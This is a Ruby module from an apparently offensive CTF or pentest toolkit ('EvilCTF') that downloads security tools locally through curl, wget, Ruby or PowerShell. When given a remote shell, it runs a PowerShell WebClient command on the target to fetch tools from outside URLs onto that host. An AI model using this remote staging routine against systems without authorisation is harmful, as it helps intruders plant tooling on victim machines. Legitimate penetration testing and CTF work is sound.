# frozen_string_literal: true

require 'fileutils'
require 'shellwords'
require 'zip'
require 'open-uri'

module EvilCTF
  module Tools
    module Downloader
      module_function

      def download_tool(key, registry:, remote_download: false, shell: nil)
        tool = registry[key]
        return nil unless tool && (tool[:download_url] || tool[:backup_urls])

        FileUtils.mkdir_p('tools')
        path = File.join('tools', tool[:filename])
        if File.exist?(path)
          puts "[+] #{tool[:name]} already downloaded at #{path}"
          return path
        end

        if remote_download && shell
          begin
            puts "[*] Attempting remote download on target for #{key}..."
            ps_cmd = <<~PS
              try {
                (New-Object System.Net.WebClient).DownloadFile('#{EvilCTF::Utils.escape_ps_string(tool[:download_url])}', '#{EvilCTF::Utils.escape_ps_string(tool[:recommended_remote])}')
                "SUCCESS"
              } catch {
                "ERROR: $($_.Exception.Message)"
              }
            PS
            result = shell.run(ps_cmd)
            if result.output.include?('SUCCESS')
              puts "[+] Remote download success for #{key}"
              return tool[:recommended_remote]
            end

            puts "[!] Remote download failed: #{result.output}"
          rescue StandardError => e
            puts "[!] Remote download error: #{e.message}"
          end
        end

        all_urls = [tool[:download_url]] + (tool[:backup_urls] || [])
        all_urls.compact!
        success = false
        all_urls.each do |url|
          next unless url

          puts "[*] Attempting local download from #{url}..."
          success = download_from_url(url, path)
          if success
            puts "[+] Success from #{url}"
            break
          end

          puts "[!] Failed from #{url}"
        end

        if success
          path
        else
          puts "[!] All attempts failed for #{key}. Check network or URLs."
          nil
        end
      rescue StandardError => e
        puts "[!] Error downloading #{key}: #{e.message}"
        nil
      end

      def download_from_url(url, path)
        puts '[*] Trying curl...'
        curl_cmd = "curl -L --fail -o #{Shellwords.escape(path)} #{Shellwords.escape(url)}"
        success = system("#{curl_cmd} > /dev/null 2>&1")
        return success if success

        puts '[*] Trying wget...'
        wget_cmd = "wget -O #{Shellwords.escape(path)} #{Shellwords.escape(url)}"
        success = system("#{wget_cmd} > /dev/null 2>&1")
        return success if success

        puts '[*] Trying Ruby URI.open...'
        begin
          URI.open(url) do |f|
            File.binwrite(path, f.read)
          end
          success = true
        rescue StandardError => e
          puts "[!] Ruby URI failed: #{e.message}"
        end
        return success if success

        puts '[*] Trying PowerShell Invoke-WebRequest...'
        ps_cmd = "powershell -Command \"try { Invoke-WebRequest -Uri '#{EvilCTF::Utils.escape_ps_string(url)}' -OutFile '#{EvilCTF::Utils.escape_ps_string(path)}' -UseBasicParsing } catch { exit 1 }\""
        system(ps_cmd)
      end

      def download_missing_tools(registry:, remote_download: false, shell: nil)
        failures = []
        registry.each do |key, tool|
          puts "\n[*] Checking #{tool[:name]} (#{key})..."

          if tool[:zip]
            local_path = File.join('tools', tool[:filename])

            unless File.exist?(local_path)
              puts "[*] Downloading ZIP for #{tool[:name]}..."
              unless download_tool(key, registry: registry, remote_download: remote_download, shell: shell)
                failures << key
                next
              end
            end

            if !remote_download && File.exist?(local_path) && tool[:zip_pick]
              puts "[*] Extracting ZIP locally for #{tool[:name]}..."
              begin
                Zip::File.open(local_path) do |zip_file|
                  if zip_file.find_entry(tool[:zip_pick])
                    zip_file.extract(tool[:zip_pick], local_path.gsub('.zip', ''))
                  end
                end
              rescue StandardError => e
                puts "[!] ZIP extraction failed locally: #{e.message}"
              end
            end
          elsif !download_tool(key, registry: registry, remote_download: remote_download, shell: shell)
            failures << key
          end
        end

        if failures.any?
          puts "\n[!] Failed to download: #{failures.join(', ')}"
          puts "[*] Suggestion: Manually download from #{registry[failures.first][:url]} or check connectivity."
        else
          puts '[+] All tools downloaded successfully.'
        end
      end
    end
  end
end
